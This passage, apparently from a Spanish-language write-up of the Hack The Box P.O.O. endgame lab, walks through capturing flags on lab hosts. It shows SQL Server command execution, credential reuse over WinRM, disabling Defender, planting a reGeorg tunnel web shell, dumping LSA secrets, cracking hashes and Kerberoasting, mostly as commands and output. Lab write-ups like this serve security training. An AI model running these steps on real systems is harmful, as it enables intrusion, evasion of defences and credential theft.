+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos ejecutar <code class="language-plaintext highlighter-rouge">comandos</code> en el sistema como un usuario de <code class="language-plaintext highlighter-rouge">servicio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell whoami
+
+output
+---------------------------  
+nt service\mssql$poo_public
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podriamos pensar en hacer una <code class="language-plaintext highlighter-rouge">reverse shell</code> sin embargo tenemos una gran limitación y es que no tenemos ningun tipo <code class="language-plaintext highlighter-rouge">conexión</code> hacia nuestro equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell ping 10.10.14.10
+
+output
+----------------------------------------------------------  
+
+Pinging 10.10.14.10 with 32 bytes of data:
+General failure.
+General failure.
+General failure.
+General failure.
+
+Ping statistics for 10.10.14.10:
+    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Enumerando el servidor en la carpeta <code class="language-plaintext highlighter-rouge">wwwroot</code> donde esta montada la <code class="language-plaintext highlighter-rouge">web</code> encontramos un archivo <code class="language-plaintext highlighter-rouge">web.config</code> que puede contener algo interesante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell dir C:\inetpub\wwwroot
+
+output
+-----------------------------------------------------  
+
+ Volume in drive C has no label.
+ Volume Serial Number is F661-7669
+
+ Directory of C:\inetpub\wwwroot
+
+04/05/2023  05:24 AM    &ltDIR>          .
+04/05/2023  05:24 AM    &ltDIR>          ..
+02/19/2018  02:15 PM            10,244 .DS_Store
+03/17/2018  12:56 PM    &ltDIR>          .Trashes
+04/05/2023  05:40 AM    &ltDIR>          admin
+03/17/2018  12:56 PM    &ltDIR>          dev
+12/13/2019  04:58 AM               703 iisstart.htm
+12/13/2019  04:58 AM            99,710 iisstart.png
+03/17/2018  12:56 PM    &ltDIR>          Images
+03/17/2018  12:56 PM    &ltDIR>          JS
+03/17/2018  12:56 PM    &ltDIR>          META-INF
+03/17/2018  12:56 PM    &ltDIR>          New folder
+03/17/2018  12:56 PM    &ltDIR>          New folder (2)
+03/17/2018  12:57 PM    &ltDIR>          Plugins
+03/17/2018  12:57 PM    &ltDIR>          Templates
+04/05/2023  05:24 AM    &ltDIR>          test
+03/17/2018  12:57 PM    &ltDIR>          Themes
+03/17/2018  12:57 PM    &ltDIR>          Uploads
+04/04/2018  12:24 PM               728 web.config
+03/17/2018  12:57 PM    &ltDIR>          Widgets
+
+               4 File(s)        111,385 bytes
+              16 Dir(s)   6,624,051,200 bytes free
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al intentar leerlo nos encontramos con que el usuario no tiene <code class="language-plaintext highlighter-rouge">permisos</code> para hacerlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell type C:\inetpub\wwwroot\web.config  
+
+output
+-----------------
+Access is denied.
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Hay otras formas de ejecutar <code class="language-plaintext highlighter-rouge">comandos</code>, usando <code class="language-plaintext highlighter-rouge">sp_execute_external_script</code> podemos ejecutar con <code class="language-plaintext highlighter-rouge">python</code> un comando en el sistema ahora como <code class="language-plaintext highlighter-rouge">poo_public01</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> sp_execute_external_script @language=N'python', @script=N'import os; os.system("whoami")';  
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script:
+
+compatibility\poo_public01
+
+Express Edition will continue to be enforced.
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Este usuario si que tiene <code class="language-plaintext highlighter-rouge">privilegios</code> para leerlo, vemos una estructura en <code class="language-plaintext highlighter-rouge">xml</code>, y en un comentario tiene <code class="language-plaintext highlighter-rouge">credenciales</code> para autenticarnos en la web contra <code class="language-plaintext highlighter-rouge">/admin</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> sp_execute_external_script @language=N'python', @script=N'import os; os.system("type C:\inetpub\wwwroot\web.config")';  
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script:
+
+&lt?xml version="1.0" encoding="UTF-8"?>
+&ltconfiguration>
+    &ltsystem.webServer>
+        &ltstaticContent>
+            &ltmimeMap
+                fileExtension=".DS_Store"
+                mimeType="application/octet-stream"
+            />
+        &lt/staticContent>
+        &lt!--
+        &ltauthentication mode="Forms">
+            &ltforms name="login" loginUrl="/admin">
+                &ltcredentials passwordFormat = "Clear">
+                    &ltuser
+                        name="Administrator"
+                        password="EverybodyWantsToWorkAtP.O.O."
+                    />
+                &lt/credentials>
+            &lt/forms>
+        &lt/authentication>
+        -->
+    &lt/system.webServer>
+&lt/configuration>
+
+Express Edition will continue to be enforced.
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Hacemos una simple petición con <code class="language-plaintext highlighter-rouge">curl</code> hacia el directorio <code class="language-plaintext highlighter-rouge">/admin</code> indicando las <code class="language-plaintext highlighter-rouge">credenciales</code> con el parametro <code class="language-plaintext highlighter-rouge">-u</code>, en la respuesta nos encontramos con la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">http:/10.13.38.11/admin/ -u Administrator:EverybodyWantsToWorkAtP.O.O.  
+"I can't go back to yesterday, because i was a different person then..."  
+- Alice in Wonderland
+Flag : POO{4882bd2ccfd4b5318978540d9843729f}</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="flag4">
+<br><h3 class="post-title">Foothold</h3>
+<h4 class="post-title">POO{ff87c4fe10e2ef096f9a96a01c646f8f}</h4><br>
+
+<p class="plain-text">Vamos la forma intencionada, con <code class="language-plaintext highlighter-rouge">ipconfig</code> podemos ver la <code class="language-plaintext highlighter-rouge">Ipv6</code> de la máquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell ipconfig
+
+output
+--------------------------------------------------------------------  
+
+Windows IP Configuration
+
+Ethernet adapter Ethernet1:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 172.20.128.101
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . :
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::21
+   IPv6 Address. . . . . . . . . . . : dead:beef::1001
+   IPv6 Address. . . . . . . . . . . : dead:beef::c2b:31da:7f3e:8a1d  
+   Link-local IPv6 Address . . . . . : fe80::c2b:31da:7f3e:8a1d%5
+   IPv4 Address. . . . . . . . . . . : 10.13.38.11
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : dead:beef::1
+                                       fe80::250:56ff:feb9:deb9%5
+                                       10.13.38.2
+
+SQL> xp_cmdshell hostname
+
+output
+-------------
+COMPATIBILITY
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacer un escaneo nuevamente con <code class="language-plaintext highlighter-rouge">nmap</code> esta vez por <code class="language-plaintext highlighter-rouge">Ipv6</code> encontramos el puerto <code class="language-plaintext highlighter-rouge">5985</code> que es <code class="language-plaintext highlighter-rouge">winrm</code> el cual con <code class="language-plaintext highlighter-rouge">credenciales</code> nos permite obtener una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">--min-rate 5000 -p- -6 dead:beef::1001  
+Nmap scan report for dead:beef::1001
+PORT     STATE SERVICE
+80/tcp   open  http
+1433/tcp open  ms-sql-s
+5985/tcp open  wsman</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para trabajar mas comodos la agregaremos al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> con el <code class="language-plaintext highlighter-rouge">hostname</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">'dead:beef::1001 compatibility' </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Antes habiamos encontrado <code class="language-plaintext highlighter-rouge">credenciales</code> para la web en <code class="language-plaintext highlighter-rouge">/admin</code>, al reutilizarlas con <code class="language-plaintext highlighter-rouge">crackmapexec</code> hacia <code class="language-plaintext highlighter-rouge">winrm</code> nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code>, significa que son validas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">winrm compatibility -u Administrator -p EverybodyWantsToWorkAtP.O.O.
+</span><span class="az">SMB         </span><span class="p">compatibility   5985   NONE             </span><span class="az">[*] </span><span class="p">None (name:compatibility) (domain:None)
+</span><span class="az">HTTP        </span><span class="p">compatibility   5985   NONE             </span><span class="az">[*] </span><span class="p">http://compatibility:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">compatibility   5985   NONE             </span><span class="ve">[+] </span><span class="p">None\Administrator:EverybodyWantsToWorkAtP.O.O. </span><span class="am">(Pwn3d!)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente usar <code class="language-plaintext highlighter-rouge">evil-winrm</code> para conectarnos como <code class="language-plaintext highlighter-rouge">Administrador</code> y conseguir una <code class="language-plaintext highlighter-rouge">powershell</code> en la maquina perteneciente al hostname <code class="language-plaintext highlighter-rouge">compatibility</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i compatibility -u Administrator -p EverybodyWantsToWorkAtP.O.O.  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+compatibility\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type </span><span class="p">..\Desktop\flag.txt
+POO{ff87c4fe10e2ef096f9a96a01c646f8f}
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="flag5">
+<br><h3 class="post-title">p00ned</h3>
+<h4 class="post-title">POO{1196ef8bc523f084ad1732a38a0851d6}</h4><br>
+
+<p class="plain-text">Podemos crear un <code class="language-plaintext highlighter-rouge">proxy</code> mediante la web usando <a href="https://github.com/sensepost/reGeorg">reGeorg</a>, pero antes de esto deshabilitaremos la busqueda de <code class="language-plaintext highlighter-rouge">virus</code> para evitar problemas con el <code class="language-plaintext highlighter-rouge">script</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">Set-MpPreference </span><span class="c1">-DisableRealtimeMonitoring </span><span class="ve">$true  </span><span class="p">
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora subimos el <code class="language-plaintext highlighter-rouge">tunnel.aspx</code> en el directorio <code class="language-plaintext highlighter-rouge">wwwroot</code> donde esta montada la web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\inetpub\wwwroot> </span><span class="am">upload </span><span class="p">tunnel.aspx
+</span><span class="az">
+Info: Uploading tunnel.aspx to C:\inetpub\wwwroot\tunnel.aspx  
+</span><span class="sa">
+Data: 6612 bytes of 6612 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\inetpub\wwwroot></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Por defecto la web no ejecuta <code class="language-plaintext highlighter-rouge">aspx</code> pero podemos instalar la extension facilmente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\inetpub\wwwroot> </span><span class="am">dism </span><span class="p">/online /enable-feature /all /featurename:IIS-ASPNET45  
+
+Deployment Image Servicing and Management tool
+Version: 10.0.17763.771
+
+Image Version: 10.0.17763.914
+
+Enabling feature(s)
+
+[==========================100.0%==========================]
+
+The operation completed successfully.
+
+PS C:\inetpub\wwwroot></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora desde nuestro equipo ejecutamos el script de <code class="language-plaintext highlighter-rouge">reGeorg</code> con <code class="language-plaintext highlighter-rouge">python2</code> para conectarnos al archivo <code class="language-plaintext highlighter-rouge">aspx</code> en la web y crear un <code class="language-plaintext highlighter-rouge">proxy</code> indicando el puerto <code class="language-plaintext highlighter-rouge">1080</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">reGeorgSocksProxy.py -p 1080 -u http://10.13.38.11/tunnel.aspx
+</span><span class="am">                     _____
+  _____   ______  __|___  |__  ______  _____  _____   ______
+ |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
+ |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
+ |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
+                    |_____|
+                    ... every office needs a tool like Georg
+
+  willem@sensepost.com / @_w_m__
+  sam@sensepost.com / @trowalts
+  etienne@sensepost.com / @kamp_staaldraad
+</span><span class="p">
+[INFO   ]  Log Level set to [INFO]
+[INFO   ]  Starting socks server [127.0.0.1:1080], tunnel at [http://10.13.38.11/tunnel.aspx]  
+[INFO   ]  Checking if Georg is ready
+[INFO   ]  Georg says, 'All seems fine'</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Desde la máquina podemos hacer un <code class="language-plaintext highlighter-rouge">ping</code> al DC para poder ver su dirección <code class="language-plaintext highlighter-rouge">Ipv4</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">ping </span><span class="p">dc
+
+Pinging DC.intranet.poo [172.20.128.53] with 32 bytes of data:  
+Reply from 172.20.128.53: bytes=32 time<1ms TTL=128
+Reply from 172.20.128.53: bytes=32 time<1ms TTL=128
+Reply from 172.20.128.53: bytes=32 time<1ms TTL=128
+Reply from 172.20.128.53: bytes=32 time<1ms TTL=128
+
+Ping statistics for 172.20.128.53:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 0ms, Average = 0ms
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para trabajar mas comodamente agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> y los hostnames de las 2 maquinas que sabemos que existen al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que sepa donde resolver</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ tail </span><span class="p">-n2 /etc/hosts
+172.20.128.53 intranet.poo dc.intranet.poo  
+172.20.128.101 compatibility.intranet.poo  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como somos administradores locales podemos dumpear los secretos <code class="language-plaintext highlighter-rouge">lsa</code>, al hacerlo encontramos 2 hashes que pertenecen a los usuarios <code class="language-plaintext highlighter-rouge">p00_dev</code> y <code class="language-plaintext highlighter-rouge">p00_adm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec smb compatibility.intranet.poo -u Administrator -p EverybodyWantsToWorkAtP.O.O. --local-auth --lsa
+</span><span class="az">SMB         </span><span class="p">compatibility.intranet.poo 445    COMPATIBILITY    </span><span class="az">[*] </span><span class="p">Windows Server 2019 Standard 17763 x64 (name:COMPATIBILITY) (domain:COMPATIBILITY) (signing:False) (SMBv1:True)
+</span><span class="az">SMB         </span><span class="p">compatibility.intranet.poo 445    COMPATIBILITY    </span><span class="ve">[+] </span><span class="p">COMPATIBILITY\Administrator:EverybodyWantsToWorkAtP.O.O. </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">compatibility.intranet.poo 445    COMPATIBILITY    </span><span class="ve">[+] </span><span class="p">Dumping LSA secrets
+</span><span class="az">SMB         </span><span class="p">compatibility.intranet.poo 445    COMPATIBILITY    </span><span class="am">INTRANET.POO/p00_dev:$DCC2$10240#p00_dev#7afecfd48f35f666ae9f6edd53506d0c: (2018-03-22 15:45:01)
+</span><span class="az">SMB         </span><span class="p">compatibility.intranet.poo 445    COMPATIBILITY    </span><span class="am">INTRANET.POO/p00_adm:$DCC2$10240#p00_adm#32c28e9a78d7c3e7d2f84cbfcabebeed: (2018-03-22 12:36:34)
+</span><span class="az">SMB         </span><span class="p">compatibility.intranet.poo 445    COMPATIBILITY    </span><span class="am">POO\COMPATIBILITY$:aes256-cts-hmac-sha1-96:edf47cf46722c46d053fc55b21363683379245aef29bb438cf3913f74bad370d
+</span><span class="az">SMB         </span><span class="p">compatibility.intranet.poo 445    COMPATIBILITY    </span><span class="am">POO\COMPATIBILITY$:aes128-cts-hmac-sha1-96:73cb8d33d34f3a3033e9677c32bfd8c2
+</span><span class="az">SMB         </span><span class="p">compatibility.intranet.poo 445    COMPATIBILITY    </span><span class="am">POO\COMPATIBILITY$:des-cbc-md5:86b558e3a75df8ec
+</span><span class="az">SMB         </span><span class="p">compatibility.intranet.poo 445    COMPATIBILITY    </span><span class="am">POO\COMPATIBILITY$:plain_password_hex:f752808d2fddd51b9592a4a7bebf36cb259411db659710089dcb2e18bea0070c79789a023eeeb5383b42b7a8943561d861dbd057ffe52f37a9531e5363abcaf7ec7a1a7b7db2703ba0fccca05f931362a18bfd93463b2a4b02c577a1b602404be60b4f124569d64195961eaaa78a69b414136907dc2ef90c3dd9196391f97e7e890b6331793dc7680a323dc16298663389ee53cbb6f1473f3d8d2de65ea5e372dcb790c5125bf6524ad2b6090ded3162a3b8e7ac13d7d3c0ab6f7107d908717dbca075fe58bf573556bd0e36215cd2f5a80ae2019ea10ced1f865b6e0e61fb8bc9398ffe6a275e7e00aca20f0da2d62e  
+</span><span class="az">SMB         </span><span class="p">compatibility.intranet.poo 445    COMPATIBILITY    </span><span class="am">POO\COMPATIBILITY$:aad3b435b51404eeaad3b435b51404ee:f01ea0e3b625736fa3e0175d34593627:::
+</span><span class="az">SMB         </span><span class="p">compatibility.intranet.poo 445    COMPATIBILITY    </span><span class="am">dpapi_machinekey:0x51d4bc23be8a2d1b3a3e2df21798f0c9b7d20e2b
+</span><span class="am">dpapi_userkey:0x0684deff7ff5a560ba47a88f3d83ff2904dda1e1
+</span><span class="az">SMB         </span><span class="p">compatibility.intranet.poo 445    COMPATIBILITY    </span><span class="am">NL$KM:994f5d6c55b9ecb50c0bd875a28893e4c0d9efc50db9405792399abe9da583ed11cb717cab32cd11fd7aed2eabbef16258f21d8aac9facfb3217d8eeb3bda5dc</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para obtener la contraseña de <code class="language-plaintext highlighter-rouge">p00_dev</code> podemos usar el <code class="language-plaintext highlighter-rouge">rockyou.txt</code> para aplicar fuerza bruta con <code class="language-plaintext highlighter-rouge">john</code> sin embargo sera necesario agregar el parametro <code class="language-plaintext highlighter-rouge">--rules</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes --rules:d3ad0ne
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 128/128 XOP 4x2])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">Development1!</span><span class="p">    (</span><span class="am">INTRANET.POO/p00_dev</span><span class="p">)</span><span class="p">
+Use the "--show --format=mscash2" options to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque esto no es igual para <code class="language-plaintext highlighter-rouge">p00_adm</code>, ya que sera necesario usar otro diccionario, en este caso lo conseguimos usando <code class="language-plaintext highlighter-rouge">Keyboard-Combinations.txt</code> de seclists</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Keyboard-Combinations.txt hashes
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 128/128 XOP 4x2])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="ro">ZQ!zaq1</span><span class="p">          (</span><span class="ro">INTRANET.POO/p00_adm</span><span class="p">)
+Use the "--show --format=mscash2" options to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al comprobar las credenciales a nivel de <code class="language-plaintext highlighter-rouge">dominio</code> hacia el DC solo son validas las de <code class="language-plaintext highlighter-rouge">p00_dev</code>, aunque de primeras no nos aporta nada realmente interesante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec smb intranet.poo -u p00_dev -p Development1!
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:DC) (domain:intranet.poo) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="ve">[+] </span><span class="p">intranet.poo\p00_dev:Development1! 
+
+</span><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec smb intranet.poo -u p00_adm -p </span><span class="am">'ZQ!zaq1'
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:DC) (domain:intranet.poo) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">intranet.poo    445    DC               </span><span class="ro">[-] </span><span class="p">intranet.poo\p00_adm:ZQ!zaq1 STATUS_LOGON_FAILURE</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para enumerar el dominio podemos hacerlo con <code class="language-plaintext highlighter-rouge">bloodhound</code> usando las credenciales del usuario <code class="language-plaintext highlighter-rouge">p00_dev</code>, toda la informacion la guardaremoz en un comprimido zip</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q bloodhound-python -u p00_dev -p Development1! -ns 172.20.128.53 -d intranet.poo -c All --zip --dns-tcp  
+INFO: Found AD domain: intranet.poo
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: DC.intranet.poo
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: DC.intranet.poo
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 9 users
+INFO: Found 54 groups
+INFO: Found 3 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: COMPATIBILITY.intranet.poo
+INFO: Querying computer: DC.intranet.poo
+INFO: Done in 01M 07S
+INFO: Compressing output into 20230928143853_bloodhound.zip</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Subimos el zip a <code class="language-plaintext highlighter-rouge">bloodhound</code> y listando todas las cuentas <code class="language-plaintext highlighter-rouge">kerberoasteables</code> encontramos 2 interesantes, los usuarios <code class="language-plaintext highlighter-rouge">p00_hr</code> y <code class="language-plaintext highlighter-rouge">p00_adm</code> son vulnerables</p>
+<a href="/endgames/poo/2.png" target="_blank"><div><p><img src="/endgames/poo/2.png"></p></div></a>   
+
+<p class="plain-text">Tenemos credenciales validas a nivel de dominio asi que con <code class="language-plaintext highlighter-rouge">GetUserSPNs</code> podemos aplicar un kerberoasting y obtener los <code class="language-plaintext highlighter-rouge">hashes</code> de las 2 cuentas vulnerables</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-GetUserSPNs intranet.poo/p00_dev:Development1! -request -dc-ip intranet.poo
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+ServicePrincipalName             Name     MemberOf                                      PasswordLastSet             LastLogon                   Delegation 
+-------------------------------  -------  --------------------------------------------  --------------------------  --------------------------  ----------
+HR_peoplesoft/intranet.poo:1433  p00_hr                                                 2018-05-10 22:32:09.135381  &ltnever>                                
+cyber_audit/intranet.poo:443     p00_adm  CN=P00 Help Desk,CN=Users,DC=intranet,DC=poo  2018-05-10 22:26:14.087657  2023-08-20 19:24:12.359050             
+
+$krb5tgs$23$*p00_hr$INTRANET.POO$intranet.poo/p00_hr*$eadd6551ee9ab527fc107a398ff38131$cde7fbcdbc22392c27c0d7099ed7101a7fef29d8afd81f9610b169db351f354263be182a4f00a74a0133378c96163574a354fdad1e2659829bb994100e36343e0325021c7aca8b66a186c40bd8df955bfce34e26c9b4fa2fd418a436a2c1cbb72a453fcb0b016b10a93e11e39df21614073d3312351e2c15fe6666cf9694b6746bfc677465ccfd00588304ede12f61a2ca2042b3c8a003b76a1bce9791aeda8e8448a1c90bb861ab063356c157c2ae279a02100fc41af2bfbdb61d6b9e2b675e98022738cd989ac3d331417447e15b8a724762f6556c365d89ab1e1ba82e06157a4cb81f9d091bd517405ad6de03e256f55efb17d3799abc295a8b4788da60ad1afb6e1140a25086a857dd368fcfc62c497a40b86a9d95938a66897e12906921484f61c82b5b3e350c9d194798a5007dd8ba43ca9cf5a605be3a38dfd035ab3451ddb8e7849ea856eb8f6e45a0e93cb1ebb750384be77b70b2da024d6a09c77b914bf841a712418db3590d243519eeafc74b7db10a42e45b55fe809b7e689bc4962833194705c9a35d8825dde580f737650be47687bcc0cf80e9710cd4b28f833d9e45bb2a11a8f561ecf32f629761d880b2d2b579fce2adbad4208dbf743279fc470d266d7c0e58a87ef015d6de08ead986c111d63b5d98b97d21f6aa654e38367a9029aa6d7c1e1485ad5a7d36742fa3fa3ee30959e6a0a3135f5f8ecda65c69eacc336c8fff8aeedf854af32ede374b5b14aeb21a1569be9910fb856fe2a237ecb0efbd05d60d76825613974e7055afe9e99bfa1db1e10b245a6d53953c8812adc4c368d3357edef71b3d8faa165b61b83009ac3874604bba1a6ead6670a44934c366c1674adc5706f07b3495a097d9eef25e49dbef964822af2baeba089c2e26de2a10e7cab825a45e8adbd7f3b9790c2e4bdc3969144a4d0fd68a7a9b33a825d7447db5e073aa2597e13eb0bb1b637812618b49e1b28d26fcd0491cd71f48bf49147e8dec8cdcc862e81a87b27fe5dadeb52f54e09146247b760c7fec59e393bacb56033fcb7f7efc59446e5b7d7bad9e8103aa98717a2341defb7ed007be4929f90fb9aee7a517becf00f3e1b85440e782b5dd309750162585ec2c0afe077dd8d7e72ada8cf2a71b92826b052d7ab38fb0fbdb8dbcaf0b9c072ff30220c6d2ac9d686fd56c5a724644d642ff276cdfa23abf2982f288d21350b99624a3466542e917363d9eb90cfaee2c10fa5f228efe0342078ad30940064e65e7051d9a22317c
+$krb5tgs$23$*p00_adm$INTRANET.POO$intranet.poo/p00_adm*$f7e544b9c50d78edf42f813373a5ee39$362c95159b6849634f38d56f5cda8119079ff639e4c36d53de966353fc865f802956866f059f766a7f0797f290f137dc6a69e6d78e5a8f02f706ea1362b7b9c42309ccc0a337c3a22e2de110d65c215b6793c360fb1df8fc3df86055ce61c8b3b44833713411bb67fa05befe2745d27a1be3e688ee930dceb6d90b5d866ff2b87686cd0e64ad286ea244c818b6b96c2af791fe557f0ff91a05e9e6a805238660720d0f07e4bc1e838d2dce3c16b094d205118c2790ea0888605abd56a2919194bce513d6b3e894bb3baed46a766e4a9afed915fa4d0bea5649b8515bcc81c538e98634eaa2cdab49f72612f228b7c2addfaad09f43131cd92b4dd121cc7236bad0137bb3a88dc3ae848c2f2f5fe861e5e3869046012c3791dc798e23638d0650ef7e9ecd051ce830a919649ce5d8deb17f88d623548ca774559b7206710da2ddde0f36e4365054a2dbf5a120d86232084f45eb53d6d8cde91aab5b3d18c3f79c8774024259ff80110dab34651ad9c5fdbcf8b0ceab3826cf6baf5f0fcf7c6d783cfe6d4f67ad0e37c7360bfbaf2a42e13f1342e2883121f609571007b17bdad709e4a2ebaa2f8c926aaf66cf0e2b7b05a1c114729847b5c1133cb4a8997fc5c3adfbbf75ddf22ef2ae5cdf43b78866cb3f5d44e5c5100286db52659916371eeb6bae756b112406d5a06ed7c5df5fda977df4c7cb1aefaf12a0f37d5556481750a7a343e765e12b39d7ef71093c96fa870c1c2c7a2626c5e589adae1f1e36a080a5d522ecafad883fad0a893ebb5512ea456cdd77e6b0162ff40e659cba174f70e8c161204d688314849d6d4ea62eb2234aa1824e9a442d2dcce49dd7e0cf83154a87fe14f063d2e85fd3afbb25392ff7f41508b1dbefa5ba7746059a90484f321beb304769feb314440495176f405409c0dc0f7ff3bb4e08adde217bdfc281d6558f4bc046c4440d358215fd27f0f8c6b9bca423ac668bdeb